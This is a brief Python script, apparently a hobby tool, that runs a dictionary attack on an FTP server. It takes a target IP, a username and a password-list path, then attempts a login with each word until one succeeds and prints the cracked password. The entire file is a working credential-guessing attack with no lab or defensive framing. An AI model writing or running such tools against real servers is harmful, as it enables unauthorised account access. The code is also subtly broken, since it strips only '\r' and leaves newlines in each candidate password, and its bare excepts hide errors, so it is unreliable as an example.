# FTP-Password-Cracker
import ftplib

# take user input IP of the FTP Server

server = input("What is the IP address of the FTP Server :")
print("Entered IP address is : ",server)

# take username as an input

username = input("What is the username of the system you want to crack :")
print("Entered Username is : ",username)

# take user input of the password list filename or location of the password list

passwordlist = input("Provide the path or filename of your password-list : ")
print("Entered path or filename is : ",passwordlist)

# use this try/except to attempt to connect to FTP server

try :
    with open(passwordlist, 'r') as pw :
        for word in pw :
            word = word.strip('\r')

            try :
                ftp = ftplib.FTP(server)
                ftp.login(username,word)
                print("Success!!! You have connected to the FTP server. The password is : ", word)
                ftp.quit()

            except :
                print("still trying...........")
except :
    print("...............wordlist error. Please enter the correct path or filename....................")
